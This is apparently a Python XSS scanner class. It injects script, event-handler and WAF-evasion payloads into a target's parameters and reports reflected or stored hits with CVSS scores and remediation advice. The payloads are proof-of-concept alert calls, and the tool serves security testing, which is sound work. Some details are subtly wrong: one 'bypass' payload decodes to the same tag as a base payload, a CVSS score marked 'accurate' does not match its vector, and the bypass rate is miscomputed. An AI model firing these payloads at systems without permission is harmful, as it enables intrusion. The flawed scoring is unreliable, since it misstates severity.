"""
XSS Scanner — Reflected & Stored XSS detection
CVSS v3.1 scoring based on actual attack vector, scope, and impact
"""

import requests
import time


class XSSScanner:
    BASE_PAYLOADS = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        '"><svg onload=alert(1)>',
        "javascript:alert(1)",
        "<body onload=alert(1)>",
    ]

    WAF_BYPASS_PAYLOADS = [
        "\u003cscript\u003ealert(1)\u003c/script\u003e",
        "<ScRiPt>alert(1)</sCrIpT>",
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        "%253Cscript%253Ealert(1)%253C/script%253E",
        "<scr<!---->ipt>alert(1)</scr<!---->ipt>",
        "<img\tsrc=x\tonerror=alert(1)>",
    ]

    # Accurate CVSS v3.1 scores per vulnerability context
    # Reflected XSS:                AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N = 6.1 Medium
    # Stored XSS (no auth needed):  AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N = 8.8 High
    # Stored XSS (auth required):   AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N = 5.4 Medium
    CVSS_MAP = {
        (True,  False): ("8.8", "high",   "AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N"),
        (True,  True):  ("5.4", "medium", "AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"),
        (False, False): ("6.1", "medium", "AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"),
        (False, True):  ("5.4", "medium", "AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"),
    }

    def __init__(self, target, endpoints, waf_detected=None):
        self.target = target
        self.endpoints = endpoints
        self.waf_detected = waf_detected
        self.request_count = 0
        self.bypass_rate = 0
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "Mozilla/5.0 (VulnScan Security Tester)"})
        self.session.timeout = 8
        self._seen = set()

    def run(self):
        findings = []
        payloads = self.BASE_PAYLOADS + (self.WAF_BYPASS_PAYLOADS if self.waf_detected else [])
        bypass_hits = 0
        total_tries = 0

        for endpoint in self.endpoints:
            url = endpoint.get("url", "")
            params = endpoint.get("params", [])
            method = endpoint.get("method", "GET").upper()
            auth_required = endpoint.get("auth_required", False)

            if not params:
                continue

            for param in params:
                dedup_key = f"{url}:{param}"
                if dedup_key in self._seen:
                    continue

                for payload in payloads:
                    total_tries += 1
                    try:
                        result = self._test_payload(url, param, payload, method)
                        self.request_count += 1

                        if result["reflected"] or result["stored"]:
                            bypass_used = payload in self.WAF_BYPASS_PAYLOADS
                            if bypass_used:
                                bypass_hits += 1

                            stored = result["stored"]
                            cvss, severity, vector = self.CVSS_MAP.get(
                                (stored, auth_required),
                                ("6.1", "medium", "AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N")
                            )

                            self._seen.add(dedup_key)
                            findings.append({
                                "type": "Stored XSS" if stored else "Reflected XSS",
                                "severity": severity,
                                "endpoint": f"{url}?{param}=",
                                "parameter": param,
                                "payload": payload,
                                "cvss": cvss,
                                "cvss_vector": vector,
                                "vector": "XSS",
                                "bypass_used": bypass_used,
                                "bypass_technique": "WAF evasion via encoding" if bypass_used else None,
                                "remediation": (
                                    "Output-encode all user-supplied data contextually (HTML, JS, URL). "
                                    "Implement a strict Content-Security-Policy header. "
                                    "Use framework-level auto-escaping and avoid innerHTML. "
                                    "Validate and sanitize all input server-side."
                                ),
                            })
                            break

                    except requests.RequestException:
                        pass
                    time.sleep(0.05)

        if total_tries > 0:
            self.bypass_rate = round((bypass_hits / total_tries) * 100, 1)

        return findings

    def _test_payload(self, url, param, payload, method):
        try:
            if method == "GET":
                resp = self.session.get(url, params={param: payload}, allow_redirects=True)
            else:
                resp = self.session.post(url, data={param: payload}, allow_redirects=True)

            body = resp.text
            reflected = payload in body
            stored = False
            if reflected and method == "POST":
                check = self.session.get(url)
                stored = payload in check.text

            return {"reflected": reflected, "stored": stored}
        except Exception:
            return {"reflected": False, "stored": False}
